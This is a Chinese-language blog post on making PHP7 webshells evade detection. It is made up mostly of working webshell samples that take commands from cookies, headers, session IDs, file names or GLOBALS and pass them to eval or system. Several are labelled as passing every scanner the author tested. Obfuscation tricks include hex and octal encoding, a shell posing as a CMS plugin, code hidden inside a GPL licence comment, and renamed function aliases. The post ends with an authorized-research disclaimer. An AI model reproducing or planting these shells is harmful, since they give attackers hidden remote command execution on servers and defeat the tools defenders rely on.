---
title: webshell免杀总结
tags:
  - webshell
  - php
---
# webshell免杀总结

**以下内容基于PHP7**

*最近对webshell的免杀机制产生了浓厚的兴趣,于是开始进行研究,参考了网上许许多多的文章,以下是我对webshell免杀的一些总结*

**使用以下网站及免杀工具进行免杀测试(带星号的表示我认为检测效果比较好的工具/网站):**

- [webshellchop 长亭(*)](https://webshellchop.chaitin.cn/)

- [深度学习](http://webshell.cdxy.me/)

- [WEBDIR+ 百度(*)](https://scanner.baidu.com/)

- [河马在线查杀](https://n.shellpub.com/)

- [D盾](http://www.d99net.net/)

- [安全狗](https://www.safedog.cn)

**参考文章:**

- [https://www.freebuf.com/articles/web/155891.html](https://www.freebuf.com/articles/web/155891.html)

- [https://bbs.symbo1.com/t/topic/94](https://bbs.symbo1.com/t/topic/94)

- [https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)

- [https://xz.aliyun.com/t/5152](https://xz.aliyun.com/t/5152)

- [http://webshell.cdxy.me/](http://webshell.cdxy.me/) 下的评论

- ...


## 免杀技术基础

### 前言

**对于webshell的免杀而言,PHP5与PHP7有很大的不同,在PHP7之后,assert这个马儿常用的函数变成了一种类似于eval的语法构造,这使得我们无法通过动态函数的方式来调用assert,这无疑是对免杀的一次沉重打击.(经过严格测试,在PHP7.0.33中依然可以,猜测应该是PHP7.1以后),因此我们需要转变思路了.标有(ALLKILL)字样的webshell通过了本文提到的所有查杀**

### 另类的入口

**我们常见的webshell入口都是_GET,_POST之类的,但是其实一切的入口我们都可以进行利用,以此来逃过查杀:**

- $_GET

- $_POST

- $_COOKIE

- $_REQUEST

- $_SERVER  其中的某些参数可控,如REQUEST_METHOD,QUERY_STRING,HTTP_USER_AGENT等

- session_id()  这个比较特殊,但是依然可以利用

- $_FILE

- $GLOBALS

- getallheaders()

- get_defined_vars()

- get_defined_functions()

**下面举几个例子:**

 ```php
 <?php
 @eval(urldecode($_FILES['file']['name']));  // 该马会把双引号给URL编码,
                                            // 因此如果payload中有双引号则需要套一层urldecode
 @eval(urldecode($_FILES['file']['type']));  // 该p马会把分号吃掉,因此需要对分号进行编码如URL编码(%3B)
                                            //因此需要套一层urldecode
 
 ?>
 ```


 ```php
 <?php
 @eval(hex2bin($_SERVER['REQUEST_METHOD']));  // 该马通过设置请求方式来实现执行,由于符号问题
                                             // 需要用bin2hex对payload进行编码
 ?>
 ```


 ```php
 <?php
 $a=$_SERVER['QUERY_STRING'];  //例子 ?php=info()&
 $a=str_replace("&",";", $a);
 $a=str_replace("=","", $a);
 @eval($a);
 ?>
 ```


 ```php
 <?php
 @eval(getallheaders()['Referer']);
 ```


 ```php
 <?php
  // (ALLKILL)
 error_reporting(0);
 eval(null.implode(reset(get_defined_vars())));  // php>=5.5 ?a=echo 1;
 ?>
 ```


 ```php
 <?php  
  // (ALLKILL)
 error_reporting(0);
 define("SS", "session_start");
 function result($arg)
 {
   return 1 > 0 ? @$arg : 0;
 }
 function hex22bin($data) {
      $len = strlen($data);
      return pack("H" . $len, $data); } 
 class deal{
   function combine_var($default=NULL){
     if (!constant("SS")) {
       return $default;
     }
     if (!preg_match('/\w+/', $this->sess)) {
       throw new Exception("$this->sess error");
     }
     $results=null;  //trash
     $results = result($this->sess);
     @eval("$this->sess");// PHP>=5.4
     // Cookie: PHPSESSID=706870696e666f28293b == phpinfo(); hex2bin("phpinfo();") => 706870696e666f28293b
   }
   function __construct($arg){
     $this->sess = $arg;
     return $this->combine_var();
   }
 }
 $son = constant("SS");
 $son();
 $sessionid = session_id();
 $sessionid = hex22bin($sessionid);
 $deals = new deal($sessionid);
 ?>
 ```


**其中比较值得注意的是GLOBALS,get_defined_vars(),getallheaders()
GLOBALS,get_defined_vars():
一个是超全局变量,一个是函数,返回值都是一个多维数组,包含了_GET,_POST等其他超全局变量,可以借此来对裸露的输入进行嵌套,如用GLOBALS['_POST'][1]代替_POST[1]
getallheaders():
获取所有的请求头(该函数拥有一些限制,具体请参照[这里](https://www.php.net/manual/en/function.getallheaders.php))
同样可以借此来尝试逃过对输入的检查**

**这里再说几个PHP的函数**

pos(),current(),reset():这三个函数的返回值都是传入数组的一个元素
next():这个函数的返回值是传入数组的第二个元素
end():这个函数的返回值是传入数组的最后一个元素
implode():可以将数组中的元素拼接起来,如拼接成字符串

可以看到**evil5.php**中我们仅仅对输入进行处理,拼接null就躲过了所有的查杀.

除了上述方法之外,我们也可以尝试从不同的"门"进入,如执行系统命令:

- system()

- exec()

- shell_exec()

- passthru()

- proc_open()

- ``  // 反引号执行系统命令

或者使用一些匿名函数,动态调用函数,回调函数:

- call_user_func

- call_user_func_array

- array_filter

- array_map

- uasort, uksort

- array_reduce

- array_udiff

- array_walk

- array_walk_recursive

- preg_replace, mb_ereg_replace

- preg_filter

- register_shutdown_function

- register_tick_function

- filter_var

- filter_var_array

- 类的反射->invoke()

- include

- file_get_contents

- create_function // 我尝试用create_function来创造免杀webshell,但似乎总是绕不过长亭

 ```php
 <?php  
 // (ALLKILL)
 error_reporting(0);
 
 function compare_by_area($a, $b) {
     $areaA = substr($a->width . $a->height, 4);
     $areaB = substr($b->width . $b->height, 4);
     if ($areaA($areaB)) {
         return -1;
     } elseif ($areaA == $areaB) {
         return 1;
     } else {
         return 0;
     }
 }
 
 $array1 = array(new stdclass);
 $array1[0]->width = 'code';
 $array1[0]->height = 'sys'.'tem';
 $array2 = array(new stdclass);
 $array2[0]->width = 'args';
 $array2[0]->height = pos(next($GLOBALS));
 array_udiff($array1, $array2, 'compare_by_area');  // PHP >=5.3
 ```


**总的来说,入口千万条,安全第一条,免杀不到位,面壁空流泪.各位师傅们可以自行测试下这些入口**

### 变形与伪装

**变形可能是我们最常见的bypass手段了,但仍然是我们通过动态检测的好手段,PHP中自带了大量对字符串进行处理变形与编码的函数,我们可以借此对我们的webshell进行操作**

以下是一些PHP自带的函数:

- substr_replace

- substr

- strtr

- str_rot13

- base64_encode

- chr

- bin2hex

- strrev

- urlencode

- json_encode

- pack

- gzcompress/gzdeflate/gzencode

- ...

另外我们还可以通过十六进制/八进制编码,取反，异或，加密，序列化,函数名大小写等等来对webshell进行变形,例如利用十六进制与八进制混编的ALLKILL webshell:

 ```php
 <?php
 // (ALLKILL) 参考https://www.freebuf.com/articles/web/155891.html中进制转换方式
 $v230c590="\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145";
 @eval(''.$v230c590(null.next(post($GLOBALS));
 ```


又如利用面向对象特性,字符拼接,动态调用变形的ALLKILL webshell:

 ```php
 <?php
 // (ALLKILL)
 $name  = basename(__FILE__);
 class combine {
     function __construct($var, $srcname)
     {
         $this->var = $var;
         $this->name = $srcname;
         $this->cookie = get_class($this);
         $this->cookie = $this->cookie[2];
     }
     function __combine($yum)
     {
         $run = $this->var;
         $run .= $this->name[3];
         $run .= 'e'.$this->cookie;
         $this->yum = $yum;
         $run(''.$this->yum);
     }
 }
 $result = new combine('sys', $name);  // php5 php7 success
 die($result->__combine($_GET[2333]));
 
 ```


**伪装则是一种有效通过静态检测的方法(虽然有点玄学,例如D盾似乎有对文件行数进行判断),我们将webshell伪装成一个正常的功能,并配上掩人耳目的名字,甚至可以逃过管理员的检查,例如下面几个例子:**

 ```php
 <?php
 /**
  * new plugin
  * @author xxcms
  * @package Glimmer
  * @subpackage PluginsShared
  */
 /**
  * get a compiler parameter and echo to console
  */
 function get_compiler_param($params, $index, $default=null)
 {
     if (!isset($params[$index])) {
         return $default;
     }
     if (!preg_match('/^([\'"]?)[a-zA-Z0-9](\\1)/', $params[$index])) {
         throw new Exception("$index is not a literal");
     }
     $t = null;
     eval("\$t = " . $params[$index]);
     return $t;
 }
 
 $params = array('code'=>$_GET[2333]);
 $a = get_compiler_param($params,'code', "whoami");
 if (isset($_GET['print'])){
     echo("<script>console.log('".$a."');</script>");
 }
 ```


 ```php
 <?php // 这个马由于extract及明显的动态调用过不了免杀,但是仍不失为一种好思路
       // copy from http://webshell.cdxy.me/
         /*            GNU GENERAL PUBLIC LICENSE
                        Version 3, 29 June 2007
 
 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
 
                         Preamble
 
 The GNU General Public License is a free, copyleft license for
 software and other kinds of works.
 
 The licenses for most software and other practical works are designed
 to take away your freedom to share and change the works.  By contrast,
 the GNU General Public License is intended to guarantee your freedom to
 share and change all versions of a program--to make sure it remains free
 software for all its users.  We, the Free Software Foundation, use the
 GNU General Public License for most of our software; it applies also to
 any other work released this way by its authors.  You can apply it to
 your programs, too.
 
 When we speak of free software, we are referring to freedom, not
 price.  Our General Public Licenses are designed to make sure that you
 have the freedom to distribute copies of free software (and charge for
 them if you wish), that you receive source code or can get it if you
 want it, that you can change the software or use pieces of it in new
 free programs, and that you know you can do these things.
 
 To protect your rights, we need to prevent others from denying you
 these rights or asking you to surrender the rights.  Therefore, you have
 certain responsibilities if you distribute copies of the software, or if
 you modify it: responsibilities to respect the freedom of others.
 
 For example, if you distribute copies of such a program, whether
 gratis or for a fee, you must pass on to the recipients the same
 freedoms that you received.  You must make sure that they, too, receive
 or can get the source code.  And you must show them these terms so they
 know their rights.
 
 Developers that use the GNU GPL protect your rights with two steps:
 (1) assert copyright on the software, and (2) offer you this License
 giving you */extract($_COOKIE);/* copy, distribute and/or modify it.
 
 For the developers' and authors' protection, the GPL clearly explains
 that there is no warranty for this free software.  For both users' and
 authors' sake, the GPL requires that modified versions be marked as
 changed, so that their problems will not be attributed erroneously to
 authors of previous versions.
 
 Some devices are designed to deny users access to install or run
 modified versions of the software inside them, although the manufacturer
 can do so.  This is fundamentally incompatible with the aim of
 protecting users' freedom to change the software.  The systematic
 pattern of such abuse occurs in the area of products for individuals to
 use, which is precisely where it is most unacceptable.  Therefore, we
 have designed this version of the GPL to prohibit the practice for those
 products.  If such problems arise substantially in other domains, we
 stand ready to extend this provision to those domains in future versions
 of the GPL, as needed to protect the freedom of users.
 
 Finally, every program is threatened constantly by software patents.
 States should not allow patents to restrict development and use of
 software on general-purpose computers, but in those that do, we wish to
 avoid the special danger that patents applied to a free program could
 make it effectively proprietary. patents applied to  GPL assures that
 patents cannot be used to render the program non-free.
 
 The precise terms and conditions for copying, distribution and
 modification follow.
 
                    TERMS AND CONDITIONS
 
 0. Definitions.
 
 "This License" refers to version 3 of the GNU General Public License.
 
 "Copyright" also means copyright-like laws that apply to other kinds of
 works, such as semiconductor masks.
 
 "The Program" refers to any copyrightable work licensed under this
 License.  Each licensee is addressed as "you".  "Licensees" and
 "recipients" may be individuals or organizations.
 
 To "modify" a work means to copy from or adapt all or part of the work
 in a fashion requiring copyright permission, other than the making of an
 exact copy.  The resulting work is called a "modified version" of the
 earlier work or a work "based on" the earlier work.
 
 A "covered work" means either the unmodified Program or a work based
 on the Program.
 
 To "propagate" a work means to do anything with it that, without
 permission, would make you directly or secondarily liable for
 infringement under applicable copyright law, except executing it on a
 computer or modifying a private copy.  Propagation includes copying,
 distribution (with or without modification), making available to the
 public, and in some countries other activities as well.
 
 To "convey" a work means any kind of propagation that enables other
 parties to make or receive copies.  Mere interaction with a user through
 a computer network, with no transfer of a copy, is not conveying.
 
 An interactive user interface displays "Appropriate Legal Notices"
 to the extent that it includes a convenient and prominently visible
 feature that (1) displays an appropriate copyright notice, and (2)
 tells the user that there is no warranty for the work (except to the
 extent that warranties are provided), that licensees may convey the
 work under this License, and how to view a copy of this License.  If
 the interface presents a list of user commands or options, such as a
 menu, a prominent item in the list meets this criterion.
 
 1. Source Code.
 
 The "source code" for a work means the preferred form of the work
 for making modifications to it.  "Object code" means any non-source
 form of a work.
 
 A "Standard Interface" means an interface that either is an official
 standard defined by a recognized standards body, or, in the case of
 interfaces specified for a particular programming language, one that
 is widely used among developers working in that language.
 
 The "System Libraries" of an executable work include anything, other
 than the work as a whole, that (a) is included in the normal form of
 packaging a Major Component, but which is not part of that Major
 Component, and (b) serves only to enable use of the work with that
 Major Component, or to implement a Standard Interface for which an
 implementation is available to the public in source code form.  A
 "Major Component", in this context, means a major essential component
 (kernel, window system, and so on) of the specific operating system
 (if any) on which the executable work runs, or a compiler used to
 produce the work, or an object code interpreter used to run it.
 
 The "Corresponding Source" for a work in object code form means all
 the source code needed to generate, install, and (for an executable
 work) run the object code and to modify the work, including scripts to
 control those activities.  However, it does not include the work's
 System Libraries, or general-purpose tools or generally available free
 programs which are used unmodified in performing those activities but
 which are not */@$PC4E20&&@$F($A,$B);/*.  For example, Corresponding Source
 
 the work, and the source code for shared libraries and dynamically
 linked subprograms that the work is specifically designed to require,
 such as by intimate data communication or control flow between those
 subprograms and other parts of the work.
 
 The Corresponding Source need not include anything that users
 can regenerate automatically from other parts of the Corresponding
 Source.
 
 The Corresponding Source for a work in source code form is that
 same work.
 
 2. Basic Permissions.
 
 All rights granted under this License are granted for the term of
 copyright on the Program, and are irrevocable provided the stated
 conditions are met.  This License explicitly affirms your unlimited
 permission to run the unmodified Program.  The output from running a
 covered work is covered by this License only if the output, given its
 content, constitutes a covered work.  This License acknowledges your
 rights of fair use or other equivalent, as provided by copyright law.
 
 You may make, run and propagate covered works that you do not
 convey, without conditions so long as your license otherwise remains
 in force.  You may convey covered works to others for the sole purpose
 of having them make modifications exclusively for you, or provide you
 with facilities for running those works, provided that you comply with
 the terms of this License in conveying all material for which you do
 not control copyright.  Those thus making or running the covered works
 for you must do so exclusively on your behalf, under your direction
 and control, on terms that prohibit them from making any copies of
 your copyrighted material outside their relationship with you.
 
 Conveying under any other circumstances is permitted solely under
 the conditions stated below.  Sublicensing is not allowed; section 10
 makes it unnecessary. */ ?>
 ```


也许上面的方法只使用一种的话无法达到免杀的目的,但是我们可以尝试嵌套使用,如定义一个函数/类,在里面进行调用

 ```php
 <?php // copy from https://xz.aliyun.com/t/5152
 function test($a,$b){
     array_map($a,$b);
 }
 test(assert,array($_POST['x']));
 ?>
 ```


 ```php
 <?php // copy from https://xz.aliyun.com/t/5152
 class loveme {
     var $a;
     var $b;
     function __construct($a,$b) {
         $this->a=$a;
         $this->b=$b;
     }
     function test() {
        array_map($this->a,$this->b);
     }
 }
 $p1=new loveme(assert,array($_POST['x']));
 $p1->test();
 ?>
 ```


### 符号干扰

**这种方法通常用于干扰查杀的正则判断,可以使用的符号有null,\n,\r,\t等**

常用的方式是将这些字符与字符串进行拼接,如果你的webshell被杀了,可以尝试一下, 如:

 ```php
 <?php // copy from https://xz.aliyun.com/t/5152
 $a = $_REQUEST['a'];
 $b = null;
 eval($b.$a);
 ?>
 ```


 ```php
 <?php // copy from https://xz.aliyun.com/t/5152
 $a = $_POST['a'];
 $b = "\n";
 eval($b.=$a);
 ?>
 ```


还有一种比较骚的姿势在函数调用中是插入一些控制符**[\x00-\x20]**,PHP引擎会忽略这些控制字符,正确执行PHP函数,如:

 ```php
 <?php  // copy from https://bbs.symbo1.com/t/topic/94
 eval\x01\x02($_POST[2333]);  //这里\x01与\x02要转换为实际的字符
 ```


### 别名/重命名

**其实PHP中是有很多函数别名的,如pos是current的别名,在PHP5.6加入了函数名的命名空间之后我们甚至可以自己创造"别名".**

这里附一个PHP7.4.3中函数别名表(个人整理,可能会有错/漏)

 ```
 bzwrite->fwrite
 bzflush->fflush
 bzclose->fclose
 isId->dom_attr_is_id
 substringData->dom_characterdata_substring_data
 appendData->dom_characterdata_append_data
 insertData->dom_characterdata_insert_data
 deleteData->dom_characterdata_delete_data
 replaceData->dom_characterdata_replace_data
 createElement->dom_document_create_element
 createDocumentFragment->dom_document_create_document_fragment
 createTextNode->dom_document_create_text_node
 createComment->dom_document_create_comment
 createCDATASection->dom_document_create_cdatasection
 createProcessingInstruction->dom_document_create_processing_instruction
 createAttribute->dom_document_create_attribute
 createEntityReference->dom_document_create_entity_reference
 getElementsByTagName->dom_document_get_elements_by_tag_name
 importNode->dom_document_import_node
 createElementNS->dom_document_create_element_ns
 createAttributeNS->dom_document_create_attribute_ns
 getElementsByTagNameNS->dom_document_get_elements_by_tag_name_ns
 getElementById->dom_document_get_element_by_id
 adoptNode->dom_document_adopt_node
 normalizeDocument->dom_document_normalize_document
 renameNode->dom_document_rename_node
 save->dom_document_save
 saveXML->dom_document_savexml
 validate->dom_document_validate
 xinclude->dom_document_xinclude
 saveHTML->dom_document_save_html
 saveHTMLFile->dom_document_save_html_file
 schemaValidate->dom_document_schema_validate_file
 schemaValidateSource->dom_document_schema_validate_xml
 relaxNGValidate->dom_document_relaxNG_validate_file
 relaxNGValidateSource->dom_document_relaxNG_validate_xml
 setParameter->dom_domconfiguration_set_parameter
 getParameter->dom_domconfiguration_get_parameter
 canSetParameter->dom_domconfiguration_can_set_parameter
 handleError->dom_domerrorhandler_handle_error
 item->dom_domimplementationlist_item
 getDomimplementation->dom_domimplementationsource_get_domimplementation
 getDomimplementations->dom_domimplementationsource_get_domimplementations
 item->dom_domstringlist_item
 getAttribute->dom_element_get_attribute
 setAttribute->dom_element_set_attribute
 removeAttribute->dom_element_remove_attribute
 getAttributeNode->dom_element_get_attribute_node
 setAttributeNode->dom_element_set_attribute_node
 removeAttributeNode->dom_element_remove_attribute_node
 getElementsByTagName->dom_element_get_elements_by_tag_name
 getAttributeNS->dom_element_get_attribute_ns
 setAttributeNS->dom_element_set_attribute_ns
 removeAttributeNS->dom_element_remove_attribute_ns
 getAttributeNodeNS->dom_element_get_attribute_node_ns
 setAttributeNodeNS->dom_element_set_attribute_node_ns
 getElementsByTagNameNS->dom_element_get_elements_by_tag_name_ns
 hasAttribute->dom_element_has_attribute
 hasAttributeNS->dom_element_has_attribute_ns
 setIdAttribute->dom_element_set_id_attribute
 setIdAttributeNS->dom_element_set_id_attribute_ns
 setIdAttributeNode->dom_element_set_id_attribute_node
 getNamedItem->dom_namednodemap_get_named_item
 setNamedItem->dom_namednodemap_set_named_item
 removeNamedItem->dom_namednodemap_remove_named_item
 item->dom_namednodemap_item
 getNamedItemNS->dom_namednodemap_get_named_item_ns
 setNamedItemNS->dom_namednodemap_set_named_item_ns
 removeNamedItemNS->dom_namednodemap_remove_named_item_ns
 count->dom_namednodemap_count
 getName->dom_namelist_get_name
 getNamespaceURI->dom_namelist_get_namespace_uri
 insertBefore->dom_node_insert_before
 replaceChild->dom_node_replace_child
 removeChild->dom_node_remove_child
 appendChild->dom_node_append_child
 hasChildNodes->dom_node_has_child_nodes
 cloneNode->dom_node_clone_node
 normalize->dom_node_normalize
 isSupported->dom_node_is_supported
 hasAttributes->dom_node_has_attributes
 compareDocumentPosition->dom_node_compare_document_position
 isSameNode->dom_node_is_same_node
 lookupPrefix->dom_node_lookup_prefix
 isDefaultNamespace->dom_node_is_default_namespace
 lookupNamespaceUri->dom_node_lookup_namespace_uri
 isEqualNode->dom_node_is_equal_node
 getFeature->dom_node_get_feature
 setUserData->dom_node_set_user_data
 getUserData->dom_node_get_user_data
 item->dom_nodelist_item
 count->dom_nodelist_count
 findOffset16->dom_string_extend_find_offset16
 findOffset32->dom_string_extend_find_offset32
 splitText->dom_text_split_text
 isWhitespaceInElementContent->dom_text_is_whitespace_in_element_content
 isElementContentWhitespace->dom_text_is_whitespace_in_element_content
 replaceWholeText->dom_text_replace_whole_text
 handle->dom_userdatahandler_handle
 registerNamespace->dom_xpath_register_ns
 query->dom_xpath_query
 evaluate->dom_xpath_evaluate
 registerPhpFunctions->dom_xpath_register_php_functions
 ftp_quit->ftp_close
 imap_header->imap_headerinfo
 imap_listmailbox->imap_list
 imap_getmailboxes->imap_list_full
 imap_scanmailbox->imap_listscan
 imap_listsubscribed->imap_lsub
 imap_getsubscribed->imap_lsub_full
 imap_fetchtext->imap_body
 imap_scan->imap_listscan
 imap_create->imap_createmailbox
 imap_rename->imap_renamemailbox
 ldap_close->ldap_unbind
 ldap_get_values->ldap_get_values_len
 ldap_modify->ldap_mod_replace
 mysqli_execute->mysqli_stmt_execute
 mysqli_escape_string->mysqli_real_escape_string
 mysqli_set_opt->mysqli_options
 autocommit->mysqli_autocommit
 begin_transaction->mysqli_begin_transaction
 change_user->mysqli_change_user
 character_set_name->mysqli_character_set_name
 close->mysqli_close
 commit->mysqli_commit
 connect->mysqli_connect
 dump_debug_info->mysqli_dump_debug_info
 debug->mysqli_debug
 get_charset->mysqli_get_charset
 get_client_info->mysqli_get_client_info
 get_client_info->mysqli_get_client_info
 get_connection_stats->mysqli_get_connection_stats
 get_server_info->mysqli_get_server_info
 get_warnings->mysqli_get_warnings
 init->mysqli_init_method
 kill->mysqli_kill
 multi_query->mysqli_multi_query
 construct->mysqli_link_construct
 more_results->mysqli_more_results
 next_result->mysqli_next_result
 options->mysqli_options
 ping->mysqli_ping
 prepare->mysqli_prepare
 query->mysqli_query
 real_connect->mysqli_real_connect
 real_escape_string->mysqli_real_escape_string
 escape_string->mysqli_real_escape_string
 real_query->mysqli_real_query
 release_savepoint->mysqli_release_savepoint
 rollback->mysqli_rollback
 savepoint->mysqli_savepoint
 select_db->mysqli_select_db
 set_charset->mysqli_set_charset
 set_opt->mysqli_options
 ssl_set->mysqli_ssl_set
 stat->mysqli_stat
 stmt_init->mysqli_stmt_init
 store_result->mysqli_store_result
 thread_safe->mysqli_thread_safe
 use_result->mysqli_use_result
 refresh->mysqli_refresh
 construct->mysqli_result_construct
 close->mysqli_free_result
 free->mysqli_free_result
 data_seek->mysqli_data_seek
 fetch_field->mysqli_fetch_field
 fetch_fields->mysqli_fetch_fields
 fetch_field_direct->mysqli_fetch_field_direct
 fetch_all->mysqli_fetch_all
 fetch_array->mysqli_fetch_array
 fetch_assoc->mysqli_fetch_assoc
 fetch_object->mysqli_fetch_object
 fetch_row->mysqli_fetch_row
 field_seek->mysqli_field_seek
 free_result->mysqli_free_result
 construct->mysqli_stmt_construct
 attr_get->mysqli_stmt_attr_get
 attr_set->mysqli_stmt_attr_set
 bind_param->mysqli_stmt_bind_param
 bind_result->mysqli_stmt_bind_result
 close->mysqli_stmt_close
 data_seek->mysqli_stmt_data_seek
 execute->mysqli_stmt_execute
 fetch->mysqli_stmt_fetch
 get_warnings->mysqli_stmt_get_warnings
 result_metadata->mysqli_stmt_result_metadata
 more_results->mysqli_stmt_more_results
 next_result->mysqli_stmt_next_result
 num_rows->mysqli_stmt_num_rows
 send_long_data->mysqli_stmt_send_long_data
 free_result->mysqli_stmt_free_result
 reset->mysqli_stmt_reset
 prepare->mysqli_stmt_prepare
 store_result->mysqli_stmt_store_result
 get_result->mysqli_stmt_get_result
 oci_free_cursor->oci_free_statement
 ocifreecursor->oci_free_statement
 ocibindbyname->oci_bind_by_name
 ocidefinebyname->oci_define_by_name
 ocicolumnisnull->oci_field_is_null
 ocicolumnname->oci_field_name
 ocicolumnsize->oci_field_size
 ocicolumnscale->oci_field_scale
 ocicolumnprecision->oci_field_precision
 ocicolumntype->oci_field_type
 ocicolumntyperaw->oci_field_type_raw
 ociexecute->oci_execute
 ocicancel->oci_cancel
 ocifetch->oci_fetch
 ocifetchstatement->oci_fetch_all
 ocifreestatement->oci_free_statement
 ociinternaldebug->oci_internal_debug
 ocinumcols->oci_num_fields
 ociparse->oci_parse
 ocinewcursor->oci_new_cursor
 ociresult->oci_result
 ociserverversion->oci_server_version
 ocistatementtype->oci_statement_type
 ocirowcount->oci_num_rows
 ocilogoff->oci_close
 ocilogon->oci_connect
 ocinlogon->oci_new_connect
 ociplogon->oci_pconnect
 ocierror->oci_error
 ocifreedesc->oci_free_descriptor
 ocisavelob->oci_lob_save
 ocisavelobfile->oci_lob_import
 ociwritelobtofile->oci_lob_export
 ociloadlob->oci_lob_load
 ocicommit->oci_commit
 ocirollback->oci_rollback
 ocinewdescriptor->oci_new_descriptor
 ocisetprefetch->oci_set_prefetch
 ocipasswordchange->oci_password_change
 ocifreecollection->oci_free_collection
 ocinewcollection->oci_new_collection
 ocicollappend->oci_collection_append
 ocicollgetelem->oci_collection_element_get
 ocicollassignelem->oci_collection_element_assign
 ocicollsize->oci_collection_size
 ocicollmax->oci_collection_max
 ocicolltrim->oci_collection_trim
 load->oci_lob_load
 tell->oci_lob_tell
 truncate->oci_lob_truncate
 erase->oci_lob_erase
 flush->oci_lob_flush
 setbuffering->ocisetbufferinglob
 getbuffering->ocigetbufferinglob
 rewind->oci_lob_rewind
 read->oci_lob_read
 eof->oci_lob_eof
 seek->oci_lob_seek
 write->oci_lob_write
 append->oci_lob_append
 size->oci_lob_size
 writetofile->oci_lob_export
 export->oci_lob_export
 import->oci_lob_import
 writetemporary->oci_lob_write_temporary
 close->oci_lob_close
 save->oci_lob_save
 savefile->oci_lob_import
 free->oci_free_descriptor
 append->oci_collection_append
 getelem->oci_collection_element_get
 assignelem->oci_collection_element_assign
 assign->oci_collection_assign
 size->oci_collection_size
 max->oci_collection_max
 trim->oci_collection_trim
 free->oci_free_collection
 odbc_do->odbc_exec
 odbc_field_precision->odbc_field_len
 openssl_free_key->openssl_pkey_free
 openssl_get_privatekey->openssl_pkey_get_private
 openssl_get_publickey->openssl_pkey_get_public
 pcntl_errno->pcntl_get_last_error
 pg_exec->pg_query
 pg_getlastoid->pg_last_oid
 pg_cmdtuples->pg_affected_rows
 pg_errormessage->pg_last_error
 pg_numrows->pg_num_rows
 pg_numfields->pg_num_fields
 pg_fieldname->pg_field_name
 pg_fieldsize->pg_field_size
 pg_fieldtype->pg_field_type
 pg_fieldnum->pg_field_num
 pg_fieldprtlen->pg_field_prtlen
 pg_fieldisnull->pg_field_is_null
 pg_freeresult->pg_free_result
 pg_result->pg_fetch_result
 pg_loreadall->pg_lo_read_all
 pg_locreate->pg_lo_create
 pg_lounlink->pg_lo_unlink
 pg_loopen->pg_lo_open
 pg_loclose->pg_lo_close
 pg_loread->pg_lo_read
 pg_lowrite->pg_lo_write
 pg_loimport->pg_lo_import
 pg_loexport->pg_lo_export
 pg_clientencoding->pg_client_encoding
 pg_setclientencoding->pg_set_client_encoding
 pg_clientencoding->pg_client_encoding
 pg_setclientencoding->pg_set_client_encoding
 posix_errno->posix_get_last_error
 session_commit->session_write_close
 snmpwalkoid->snmprealwalk
 snmp_set_oid_numeric_print->snmp_set_oid_output_format
 socket_getopt->socket_get_option
 socket_setopt->socket_set_option
 sodium_crypto_scalarmult_base->sodium_crypto_box_publickey_from_secretkey
 join->implode
 chop->rtrim
 strchr->strstr
 srand->mt_srand
 getrandmax->mt_getrandmax
 show_source->highlight_file
 ini_alter->ini_set
 checkdnsrr->dns_check_record
 getmxrr->dns_get_mx
 doubleval->floatval
 is_integer->is_int
 is_long->is_int
 is_double->is_float
 fputs->fwrite
 set_file_buffer->stream_set_write_buffer
 socket_set_blocking->stream_set_blocking
 stream_register_wrapper->stream_wrapper_register
 stream_register_wrapper->stream_wrapper_register
 socket_set_timeout->stream_set_timeout
 dir->getdir
 is_writeable->is_writable
 diskfreespace->disk_free_space
 pos->current
 sizeof->count
 key_exists->array_key_exists
 close->closedir
 rewind->rewinddir
 importStylesheet->xsl_xsltprocessor_import_stylesheet
 transformToDoc->xsl_xsltprocessor_transform_to_doc
 transformToUri->xsl_xsltprocessor_transform_to_uri
 transformToXml->xsl_xsltprocessor_transform_to_xml
 setParameter->xsl_xsltprocessor_set_parameter
 getParameter->xsl_xsltprocessor_get_parameter
 removeParameter->xsl_xsltprocessor_remove_parameter
 hasExsltSupport->xsl_xsltprocessor_has_exslt_support
 registerPHPFunctions->xsl_xsltprocessor_register_php_functions
 setProfiling->xsl_xsltprocessor_set_profiling
 setSecurityPrefs->xsl_xsltprocessor_set_security_prefs
 getSecurityPrefs->xsl_xsltprocessor_get_security_prefs
 gzrewind->rewind
 gzclose->fclose
 gzeof->feof
 gzgetc->fgetc
 gzgets->fgets
 DEP_FALIAS(gzgetss->fgetss
 gzread->fread
 gzpassthru->fpassthru
 gzseek->fseek
 gztell->ftell
 gzwrite->fwrite
 gzputs->fwrite
 getallheaders->apache_request_headers
 getallheaders->litespeed_request_headers
 apache_request_headers->litespeed_request_headers
 apache_response_headers->litespeed_response_headers
 ```


这里附的表不包含被弃用的(会有PHP警告,但仍可用),而在这些别名中,我们就可以找到可以利用的函数mbereg_replace,这个函数是mb_ereg_replace的别名,mb_ereg_replace与preg_replace类似,可以利用e模式隐式执行代码,但是mb_ereg_replace无法逃过查杀,而mbereg_replace则是ALLKILL,没错,只是一个_的差别,让他逃过了免杀的眼睛

 ```php
 <?php  
 // (ALLKILL)
 error_reporting(0);
 mbereg_replace('.*', '\0', $_REQUEST[2333], 'mer');//php5 php7 success
 ?>
 ```


另外,我们可以自己创造别名,如:

 ```php
 <?php  
 // PHP >=5.6 可过盾狗
 use function \system as strlen;  // 配合文件包含这甚至可以实现劫持,留待你们开发
 strlen($_POST[1]);
 ```


 ```php
 <?php
 // (ALLKILL)
 define("ARRAY2", "sys"."tem");
 @constant("ARRAY2")(pos(pos($GLOBALS)));  // PHP>7
 ```


**免责声明:**

1. **在对方未授权的情况下，直接或间接利用本项目涉及到的 webshell 研究样本攻击目标是违法行为.**

2. **本项目涉及到的 webshell 仅为安全研究和授权情况下使用，其使用人员有责任和义务遵守当地法律条规.**

3. **本项目涉及到的 webshell 样本及文章仅为促进安全防御研究使用，研究人员对因误用该程序造成的资产损坏和损失概不负责.**

